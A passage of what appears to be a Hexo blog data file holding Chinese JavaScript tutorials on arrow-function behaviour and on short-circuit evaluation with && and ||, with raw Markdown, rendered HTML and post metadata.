id=\"不会绑定自己的-this\"><a href=\"#不会绑定自己的-this\" class=\"headerlink\" title=\"不会绑定自己的 this\"></a>不会绑定自己的 <code>this</code></h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.body.onclick = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// this =&gt; window</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.onclick = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// this =&gt; body</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"不会绑定-arguments\"><a href=\"#不会绑定-arguments\" class=\"headerlink\" title=\"不会绑定 arguments\"></a>不会绑定 <code>arguments</code></h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">arguments</span> = <span class=\"string\">'arguments'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> fn = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"built_in\">arguments</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// arguments =&gt; 'arguments'</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"无法使用-prototype\"><a href=\"#无法使用-prototype\" class=\"headerlink\" title=\"无法使用 prototype\"></a>无法使用 <code>prototype</code></h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> fn = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'fn'</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(fn.prototype)</span><br><span class=\"line\"><span class=\"comment\">// fn.prototype =&gt; undefined</span></span><br><span class=\"line\"><span class=\"comment\">// 箭头函数没有 prototype 原型链</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"无法使用-new-关键字\"><a href=\"#无法使用-new-关键字\" class=\"headerlink\" title=\"\b无法使用 new 关键字\"></a>\b无法使用 <code>new</code> 关键字</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> fn = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'fn'</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> f = <span class=\"keyword\">new</span> fn()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Uncaught TypeError: fn is not a constructor</span></span><br><span class=\"line\"><span class=\"comment\">// 函数 fn 不是一个构造器</span></span><br></pre></td></tr></table></figure>\n<p>以上就是箭头函数的所有特性了。</p>\n<h3 id=\"在创建是初始化-this-而非调用时指定\"><a href=\"#在创建是初始化-this-而非调用时指定\" class=\"headerlink\" title=\"在创建是初始化 this 而非调用时指定\"></a>在创建是初始化 <code>this</code> 而非调用时指定</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 非箭头函数</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    fn: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> f = obj.fn();</span><br><span class=\"line\"><span class=\"keyword\">var</span> res = f(); <span class=\"comment\">// -&gt; window</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 箭头函数</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    fn: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> f = obj.fn();</span><br><span class=\"line\"><span class=\"keyword\">var</span> res = f(); <span class=\"comment\">// -&gt; obj</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>熟悉后端的人对于箭头函数应该不会陌生，在 <code>C#</code> 中它叫做 <code>Lambda表达式</code>，其他的后端语言中也一直都有他的身影。<br>箭头函数是ES6新加入的一个重要特性，它简洁明了的书写方式大大的简化了我们平时代码。下面我们\b看一下箭头函数的特性。<br>","more":"</p>\n<h3 id=\"箭头函数的特性\"><a href=\"#箭头函数的特性\" class=\"headerlink\" title=\"箭头函数的特性\"></a>箭头函数的特性</h3><ul>\n<li>自动返回</li>\n<li>不会绑定自己的 <code>this</code></li>\n<li>书写更加方便</li>\n<li>不会绑定 <code>arguments</code></li>\n<li>无法使用 <code>prototype</code></li>\n<li>\b无法使用 <code>new</code> 关键字</li>\n<li>在创建是初始化 <code>this</code> 而非调用时指定</li>\n</ul>\n<h3 id=\"自动返回\"><a href=\"#自动返回\" class=\"headerlink\" title=\"自动返回\"></a>自动返回</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 写法一</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> fn = <span class=\"function\"><span class=\"params\">a</span> =&gt;</span> a + <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 写法二</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> fn2 = <span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a + b</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 写法三</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> fn3 = <span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> (a + b)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 写法四</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> fn4 = <span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// do something</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> a + b</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当 <code>参数</code> 只有一个的时候，可以省略参数外面的 <code>()</code>;<br>当函数的表达式只有一句时，可以直接书写在 <code>=&gt;</code> 后面，表示返回该表达式；\b也可以在表达式外加上一对 <code>()</code>返回，一般用于返回 <code>字面量</code> 和 <code>提升优先级</code>。<br>如果逻辑处理过长，则使用 <code>写法四</code> 书写，该写法不会自动返回，需手动指定返回内容。</p>\n<h3 id=\"不会绑定自己的-this\"><a href=\"#不会绑定自己的-this\" class=\"headerlink\" title=\"不会绑定自己的 this\"></a>不会绑定自己的 <code>this</code></h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">document</span>.body.onclick = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// this =&gt; window</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.onclick = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// this =&gt; body</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"不会绑定-arguments\"><a href=\"#不会绑定-arguments\" class=\"headerlink\" title=\"不会绑定 arguments\"></a>不会绑定 <code>arguments</code></h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"built_in\">arguments</span> = <span class=\"string\">'arguments'</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> fn = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"built_in\">arguments</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// arguments =&gt; 'arguments'</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"无法使用-prototype\"><a href=\"#无法使用-prototype\" class=\"headerlink\" title=\"无法使用 prototype\"></a>无法使用 <code>prototype</code></h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> fn = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'fn'</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(fn.prototype)</span><br><span class=\"line\"><span class=\"comment\">// fn.prototype =&gt; undefined</span></span><br><span class=\"line\"><span class=\"comment\">// 箭头函数没有 prototype 原型链</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"无法使用-new-关键字\"><a href=\"#无法使用-new-关键字\" class=\"headerlink\" title=\"\b无法使用 new 关键字\"></a>\b无法使用 <code>new</code> 关键字</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> fn = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'fn'</span>)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> f = <span class=\"keyword\">new</span> fn()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Uncaught TypeError: fn is not a constructor</span></span><br><span class=\"line\"><span class=\"comment\">// 函数 fn 不是一个构造器</span></span><br></pre></td></tr></table></figure>\n<p>以上就是箭头函数的所有特性了。</p>\n<h3 id=\"在创建是初始化-this-而非调用时指定\"><a href=\"#在创建是初始化-this-而非调用时指定\" class=\"headerlink\" title=\"在创建是初始化 this 而非调用时指定\"></a>在创建是初始化 <code>this</code> 而非调用时指定</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 非箭头函数</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    fn: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> f = obj.fn();</span><br><span class=\"line\"><span class=\"keyword\">var</span> res = f(); <span class=\"comment\">// -&gt; window</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 箭头函数</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    fn: <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(<span class=\"keyword\">this</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> f = obj.fn();</span><br><span class=\"line\"><span class=\"keyword\">var</span> res = f(); <span class=\"comment\">// -&gt; obj</span></span><br></pre></td></tr></table></figure>"},{"title":"逻辑符号","date":"2016-11-16T03:13:46.000Z","_content":"\n说起逻辑符号，我们接触的最多的可能就是 `&&` 和 `||` 这两个比较符了。本节会介绍一下这两个逻辑运算符的 `短路操作` 规则以及使用逻辑运算符代替 `if` 的快速比较赋值操作。\n<!-- more -->\n\n### && 的短路运算规则\n当 `&&` 逻辑比较前面的值为 `true` 时，则直接返回 `&&` 后面的值(不论该值为 `true` 还是 `false`)。\n当 `&&` 逻辑比较前面的值为 `false` 时，则直接返回 `&&` 前面的值，不再关心后面的值。\n下面是例子：\n\n```js\nvar a = 5 && 6;\nconsole.log(a)\n// => 6\n```\n\n```js\nvar a = 0 && 1;\nconsole.log(a)\n// => 0\n```\n\n\n### || 的短路运算规则\n当 `||` 逻辑比较前面的值为 `false` 时，则直接返回 `||` 后面的值(不论该值为 `true` 还是 `false`)。\n当 `||` 逻辑比较前面的值为 `true` 时，则直接返回 `||` 前面的值，不再关心后面的值。\n下面是例子：\n```js\nvar a = 0 || 1;\nconsole.log(a)\n// => 1\n```\n\n```js\nvar a = 1 || 2;\nconsole.log(a)\n// => 1\n```\n\n### 进阶用法\n使用 `&&` 的短路规则代替短线 `if` 判断进行快速赋值操作。\n\n```js\n// 1\nfunction demo (param) {\n    !param && (param = {})\n}\n```\n\n```js\n// 2\nfunction demo (param) {\n    if(!param) param = {}\n}\n```\n\n上面的写法 `1` 和 `2` 的实际效果完全相同。\n\n### 优缺点\n\n###### 使用逻辑运算符代替短线 `if` 的优点:\n1. 运行速度快；`javascript` 中，逻辑运算符的执行速度是比 `if` 语句要快(参考短线操作规则)。\n2. 代码短小精悍，\b逼格更高(请忽略这点)。\n\n\n###### 使用逻辑运算符代替短线 `if` 的缺点:\n1. 执行速度是变快了，但是使用的时候必须要注意 `操作符优先级` 的问题(可以参考[这里](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Operator_Precedence))。\n2. 逼格是更高的，但是代码的可读性变的很差，不了解的人看了之后完全不知道怎么理解。\n\n\n\b\n","source":"_posts/逻辑符号.md","raw":"---\ntitle: 逻辑符号\ndate: 2016-11-16 11:13:46\ntags:\n---\n\n说起逻辑符号，我们接触的最多的可能就是 `&&` 和 `||` 这两个比较符了。本节会介绍一下这两个逻辑运算符的 `短路操作` 规则以及使用逻辑运算符代替 `if` 的快速比较赋值操作。\n<!-- more -->\n\n### && 的短路运算规则\n当 `&&` 逻辑比较前面的值为 `true` 时，则直接返回 `&&` 后面的值(不论该值为 `true` 还是 `false`)。\n当 `&&` 逻辑比较前面的值为 `false` 时，则直接返回 `&&` 前面的值，不再关心后面的值。\n下面是例子：\n\n```js\nvar a = 5 && 6;\nconsole.log(a)\n// => 6\n```\n\n```js\nvar a = 0 && 1;\nconsole.log(a)\n// => 0\n```\n\n\n### || 的短路运算规则\n当 `||` 逻辑比较前面的值为 `false` 时，则直接返回 `||` 后面的值(不论该值为 `true` 还是 `false`)。\n当 `||` 逻辑比较前面的值为 `true` 时，则直接返回 `||` 前面的值，不再关心后面的值。\n下面是例子：\n```js\nvar a = 0 || 1;\nconsole.log(a)\n// => 1\n```\n\n```js\nvar a = 1 || 2;\nconsole.log(a)\n// => 1\n```\n\n### 进阶用法\n使用 `&&` 的短路规则代替短线 `if` 判断进行快速赋值操作。\n\n```js\n// 1\nfunction demo (param) {\n    !param && (param = {})\n}\n```\n\n```js\n// 2\nfunction demo (param) {\n    if(!param) param = {}\n}\n```\n\n上面的写法 `1` 和 `2` 的实际效果完全相同。\n\n### 优缺点\n\n###### 使用逻辑运算符代替短线 `if` 的优点:\n1. 运行速度快；`javascript` 中，逻辑运算符的执行速度是比 `if` 语句要快(参考短线操作规则)。\n2. 代码短小精悍，\b逼格更高(请忽略这点)。\n\n\n###### 使用逻辑运算符代替短线 `if` 的缺点:\n1. 执行速度是变快了，但是使用的时候必须要注意 `操作符优先级` 的问题(可以参考[这里](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Operator_Precedence))。\n2. 逼格是更高的，但是代码的可读性变的很差，不了解的人看了之后完全不知道怎么理解。\n\n\n\b\n","slug":"逻辑符号","published":1,"updated":"2018-10-25T06:05:58.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjno6s7qx000k02vszjshsfsb","content":"<p>说起逻辑符号，我们接触的最多的可能就是 <code>&amp;&amp;</code> 和 <code>||</code> 这两个比较符了。本节会介绍一下这两个逻辑运算符的 <code>短路操作</code> 规则以及使用逻辑运算符代替 <code>if</code> 的快速比较赋值操作。<br><a id=\"more\"></a></p>\n<h3 id=\"amp-amp-的短路运算规则\"><a href=\"#amp-amp-的短路运算规则\" class=\"headerlink\" title=\"&amp;&amp; 的短路运算规则\"></a>&amp;&amp; 的短路运算规则</h3><p>当 <code>&amp;&amp;</code> 逻辑比较前面的值为 <code>true</code> 时，则直接返回 <code>&amp;&amp;</code> 后面的值(不论该值为 <code>true</code> 还是 <code>false</code>)。<br>当 <code>&amp;&amp;</code> 逻辑比较前面的值为 <code>false</code> 时，则直接返回 <code>&amp;&amp;</code> 前面的值，不再关心后面的值。<br>下面是例子：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">5</span> &amp;&amp; <span class=\"number\">6</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a)</span><br><span class=\"line\"><span class=\"comment\">// =&gt; 6</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">0</span> &amp;&amp; <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a)</span><br><span class=\"line\"><span class=\"comment\">// =&gt; 0</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"的短路运算规则\"><a href=\"#的短路运算规则\" class=\"headerlink\" title=\"|| 的短路运算规则\"></a>|| 的短路运算规则</h3><p>当 <code>||</code> 逻辑比较前面的值为 <code>false</code> 时，则直接返回 <code>||</code> 后面的值(不论该值为 <code>true</code> 还是 <code>false</code>)。<br>当 <code>||</code> 逻辑比较前面的值为 <code>true</code> 时，则直接返回 <code>||</code> 前面的值，不再关心后面的值。<br>下面是例子：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">0</span> || <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a)</span><br><span class=\"line\"><span class=\"comment\">// =&gt; 1</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">1</span> || <span class=\"number\">2</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a)</span><br><span class=\"line\"><span class=\"comment\">// =&gt; 1</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"进阶用法\"><a href=\"#进阶用法\" class=\"headerlink\" title=\"进阶用法\"></a>进阶用法</h3><p>使用 <code>&amp;&amp;</code> 的短路规则代替短线 <code>if</code> 判断进行快速赋值操作。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 1</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">demo</span> (<span class=\"params\">param</span>) </span>&#123;</span><br><span class=\"line\">    !param &amp;&amp; (param = &#123;&#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 2</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">demo</span> (<span class=\"params\">param</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!param) param = &#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面的写法 <code>1</code> 和 <code>2</code> 的实际效果完全相同。</p>\n<h3 id=\"优缺点\"><a href=\"#优缺点\" class=\"headerlink\" title=\"优缺点\"></a>优缺点</h3><h6 id=\"使用逻辑运算符代替短线-if-的优点\"><a href=\"#使用逻辑运算符代替短线-if-的优点\" class=\"headerlink\" title=\"使用逻辑运算符代替短线 if 的优点:\"></a>使用逻辑运算符代替短线 <code>if</code> 的优点:</h6><ol>\n<li>运行速度快；<code>javascript</code> 中，逻辑运算符的执行速度是比 <code>if</code> 语句要快(参考短线操作规则)。</li>\n<li>代码短小精悍，\b逼格更高(请忽略这点)。</li>\n</ol>\n<h6 id=\"使用逻辑运算符代替短线-if-的缺点\"><a href=\"#使用逻辑运算符代替短线-if-的缺点\" class=\"headerlink\" title=\"使用逻辑运算符代替短线 if 的缺点:\"></a>使用逻辑运算符代替短线 <code>if</code> 的缺点:</h6><ol>\n<li>执行速度是变快了，但是使用的时候必须要注意 <code>操作符优先级</code> 的问题(可以参考<a href=\"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Operator_Precedence\" target=\"_blank\" rel=\"noopener\">这里</a>)。</li>\n<li>逼格是更高的，但是代码的可读性变的很差，不了解的人看了之后完全不知道怎么理解。</li>\n</ol>\n<p>\b</p>\n","site":{"data":{}},"excerpt":"<p>说起逻辑符号，我们接触的最多的可能就是 <code>&amp;&amp;</code> 和 <code>||</code> 这两个比较符了。本节会介绍一下这两个逻辑运算符的 <code>短路操作</code> 规则以及使用逻辑运算符代替 <code>if</code> 的快速比较赋值操作。<br>","more":"</p>\n<h3 id=\"amp-amp-的短路运算规则\"><a href=\"#amp-amp-的短路运算规则\" class=\"headerlink\" title=\"&amp;&amp; 的短路运算规则\"></a>&amp;&amp; 的短路运算规则</h3><p>当 <code>&amp;&amp;</code> 逻辑比较前面的值为 <code>true</code> 时，则直接返回 <code>&amp;&amp;</code> 后面的值(不论该值为 <code>true</code> 还是 <code>false</code>)。<br>当 <code>&amp;&amp;</code> 逻辑比较前面的值为 <code>false</code> 时，则直接返回 <code>&amp;&amp;</code> 前面的值，不再关心后面的值。<br>下面是例子：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">5</span> &amp;&amp; <span class=\"number\">6</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a)</span><br><span class=\"line\"><span class=\"comment\">// =&gt; 6</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">0</span> &amp;&amp; <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a)</span><br><span class=\"line\"><span class=\"comment\">// =&gt; 0</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"的短路运算规则\"><a href=\"#的短路运算规则\" class=\"headerlink\" title=\"|| 的短路运算规则\"></a>|| 的短路运算规则</h3><p>当 <code>||</code> 逻辑比较前面的值为 <code>false</code> 时，则直接返回 <code>||</code> 后面的值(不论该值为 <code>true</code> 还是 <code>false</code>)。<br>当 <code>||</code> 逻辑比较前面的值为 <code>true</code> 时，则直接返回 <code>||</code> 前面的值，不再关心后面的值。<br>下面是例子：<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">0</span> || <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(a)</span><br><span class=\"line\"><span class=\"comment\">// =&gt; 1</span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight 